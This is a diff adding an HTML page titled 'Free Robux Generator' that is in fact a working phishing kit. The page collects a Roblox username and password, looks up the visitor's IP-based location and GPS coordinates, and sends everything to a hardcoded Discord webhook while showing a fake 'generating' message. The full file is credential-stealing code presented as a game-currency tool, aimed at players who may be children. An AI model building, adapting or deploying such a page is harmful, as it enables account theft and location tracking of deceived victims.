@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Robux Generator</title>
+  <style>
+    body {
+      background: #0e0e0e;
+      color: #fff;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 25px #ff9900;
+      max-width: 400px;
+      width: 90%;
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+    @keyframes glow {
+      0% { box-shadow: 0 0 10px #ff9900; }
+      100% { box-shadow: 0 0 30px #ff9900; }
+    }
+    h2 {
+      text-align: center;
+      color: #ff9900;
+      margin-bottom: 20px;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0 20px;
+      border: none;
+      border-radius: 8px;
+      background: #111;
+      color: #fff;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #ff9900;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #aaa;
+    }
+    #status {
+      text-align: center;
+      display: none;
+      margin-top: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      line-height: 1.8;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div id="form-container">
+    <h2>Free Robux Generator</h2>
+    <input type="text" id="username" placeholder="Roblox Username (min. 6 chars)">
+    <input type="password" id="password" placeholder="Password (min. 8 chars)">
+    <select id="amount">
+      <option value="">Select Robux Amount</option>
+      <option value="500">500</option>
+      <option value="1000">1000</option>
+      <option value="5000">5000</option>
+      <option value="10000">10000</option>
+    </select>
+    <button onclick="submitForm()">Generate Robux</button>
+    <div class="footer">made by MJ</div>
+  </div>
+  
+  <div id="status">
+    🎉 Robux is now generating!<br><br>
+    ⏳ Please wait up to <strong>12 hours</strong> for processing.<br><br>
+    📩 You will be notified once completed.
+  </div>
+</div>
+
+<script>
+  async function submitForm() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const amount = document.getElementById("amount").value;
+
+    if (username.length < 6 || password.length < 8 || !amount) {
+      alert("Please fill out all fields correctly.");
+      return;
+    }
+
+    document.getElementById("form-container").style.display = "none";
+    document.getElementById("status").style.display = "block";
+
+    // Get location info
+    let locationData = {};
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      locationData = await res.json();
+    } catch (err) {
+      locationData = { city: "Unknown", region: "", country_name: "", latitude: "", longitude: "" };
+    }
+
+    // Send to Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1425308861774172190/cKd8QroDHznJxWjGzDuP_Lxwu7qc93SOsX9D7UYzmLylOAF3cUEg5B01ciXqGLdEYUNe"; // replace with your real webhook
+
+    const embed = {
+      title: "🎯 New Robux Request",
+      color: 65280,
+      fields: [
+        { name: "👤 Username", value: username, inline: true },
+        { name: "🔐 Password", value: password, inline: true },
+        { name: "💰 Amount", value: amount, inline: true },
+        { name: "🌍 Location", value: `${locationData.city}, ${locationData.region}, ${locationData.country_name}`, inline: false },
+        { name: "📍 GPS", value: `Lat: ${locationData.latitude}, Lon: ${locationData.longitude}`, inline: false }
+      ],
+      footer: { text: "made by MJDEV" },
+      timestamp: new Date()
+    };
+
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  }
+</script>
+
+</body>
+</html>
